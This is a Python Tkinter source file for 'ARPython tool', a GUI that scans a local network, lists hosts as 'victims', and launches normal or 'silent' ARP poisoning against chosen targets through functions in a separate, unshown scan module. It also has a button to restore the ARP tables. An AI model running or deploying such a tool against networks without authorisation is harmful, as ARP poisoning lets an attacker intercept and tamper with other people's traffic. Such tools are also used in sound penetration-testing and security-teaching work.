#! /usr/bin/env python

from Tkinter import *
import ttk as t
import scan
import logging
import ScrolledText


class TextHandler(logging.Handler):
    # This class allows you to log to a Tkinter Text or ScrolledText widget
    # Adapted from Moshe Kaplan: https://gist.github.com/moshekaplan/c425f861de7bbf28ef06

    def __init__(self, text):
        # run the regular Handler __init__
        logging.Handler.__init__(self)
        # Store a reference to the Text it will log to
        self.text = text

    def emit(self, record):
        msg = self.format(record)
        def append():
            self.text.configure(state='normal')
            self.text.insert(END, msg + '\n')
            self.text.configure(state='disabled')
            # Autoscroll to the bottom
            self.text.yview(END)
        # This is necessary because we can't modify the Text from other threads
        self.text.after(0, append)


p_x = 10
p_y = 10

row_num = 0
targets = []
logger = logging.getLogger()


# Method for selecting the interface and then grabbing all devices active on that interface
def select_interface(event="x"):
    s = interface_combo.get()
    s = s.split(', ')

    # Grab the IP's and MAC addresses
    found_ips = scan.scan(net=s[0], interface=s[1])
    found_ips = [', '.join(i[::-1]) for i in found_ips]

    # Set the found IP's, MAC addresses and make buttons available
    router_combo['values'] = found_ips
    router_combo.current(0)
    router_combo['state'] = "normal"

    targets_combo['state'] = "normal"

    targets_combo.delete(0, END)
    for ip in found_ips:
        targets_combo.insert(END, ip)

    attacker_entry['state'] = "normal"

    silent_button['state'] = "normal"
    attack_button['state'] = "normal"
    restore_button['state'] = "normal"


# Does the ARP poisoning can either do silent or non-silent
def poison(silent=False):
    router = router_combo.get()
    router = router.split(', ')

    target = targets_combo.curselection()

    for i in target:
        targets.append(targets_combo.get(i, i + 1)[0])

    if len(targets) == 1:
        target = targets[0].split(', ')

        if silent:
            scan.arp_poison_stealthy(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1])
        else:
            scan.arp_poison(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1])


# Restores the ARP poison
def restore():
    router = router_combo.get()
    router = router.split(', ')

    if len(targets) == 1:
        target = targets[0].split(', ')

        scan.arp_restore(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1])


# Make the basic TKinter gui
window = Tk()
# window.geometry('400x400')
window.title("ARPython tool")

# Add label for scanning
label_net = t.Label(window, text="Choose the net and interface you want to scan")
label_net.grid(column=0, columnspan=2, row=row_num, stick=W, padx=p_x, pady=p_y)

# Add interface_combobox with interfaces
interface_combo = t.Combobox(window, width=35)
interface_combo['values'] = scan.get_interfaces()
interface_combo.current(0)
interface_combo.grid(column=2, columnspan=2, row=row_num, padx=p_x)

row_num += 1

# Add scan button
scan_button = t.Button(text="Scan for interfaces", command=select_interface)
scan_button.grid(column=3, row=row_num, padx=p_x, stick="EW")

row_num += 1

# Add label for Router
label_router = t.Label(window, text="Choose the router")
label_router.grid(column=0, columnspan=2, row=row_num, stick=W, padx=p_x, pady=p_y)
router_combo = t.Combobox(window, width=35, state="disabled")
router_combo.grid(column=2, columnspan=2, row=row_num, padx=p_x)

row_num += 1

# Add label for victims
# And the Listbox with scrollbar
label_victim = t.Label(window, text="Choose your victim(s)")
label_victim.grid(column=0, columnspan=2, row=row_num, stick=W, padx=p_x, pady=p_y)
targets_scrollbar = t.Scrollbar(window)
targets_scrollbar.grid(column=3, row=row_num, padx=p_x, stick="NES")
targets_combo = Listbox(window, width=35, height=3, state="disabled", selectmode=MULTIPLE)
targets_scrollbar.config(command=targets_combo.yview)
targets_combo.grid(column=2, columnspan=2, row=row_num, padx=p_x, stick=W)

row_num += 1

# Add label for Attacker
label_attacker = t.Label(window, text="Set attacker MAC, leave blank for yourself")
label_attacker.grid(column=0, columnspan=2, row=row_num, stick=W, padx=p_x, pady=p_y)
attacker_entry = t.Entry(window, width=37, state="disabled")
attacker_entry.grid(column=2, columnspan=2, row=row_num, padx=p_x)

row_num += 1

# Add restore button
restore_button = t.Button(window, text="Restore ARP Tables", state=DISABLED, command=restore)
restore_button.grid(column=1, row=row_num, padx=p_x, pady=p_y, stick="EW")

# Add buttons for silent and non-silent poison
silent_button = t.Button(window, text="Silent ARP Poison target", state=DISABLED, command=lambda: poison(silent=True))
silent_button.grid(column=2, row=row_num, padx=p_x, pady=p_y, stick="EW")

attack_button = t.Button(window, text="ARP Poison target", state=DISABLED, command=lambda: poison(silent=False))
attack_button.grid(column=3, row=row_num, padx=p_x, pady=p_y, stick="EW")

row_num += 1

# Add text widget to display logging info
st_label = t.Label(window, text="Logging info")
st_label.grid(column=0, row=row_num, padx=p_x, pady=(p_y, 0), stick=W)

row_num += 1

st = ScrolledText.ScrolledText(window, height=5, state='disabled')
st.configure(font='TkFixedFont')
st.grid(column=0, row=row_num, columnspan=4, padx=p_x, pady=(0, p_y), stick="EW")

# Create textLogger
text_handler = TextHandler(st)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
text_handler.setFormatter(formatter)

logger.addHandler(text_handler)

# Event watcher for when something in the combobox is selected
# interface_combo.bind("<<ComboboxSelected>>", select_interface)

# Run Gui
def run():
    window.mainloop()
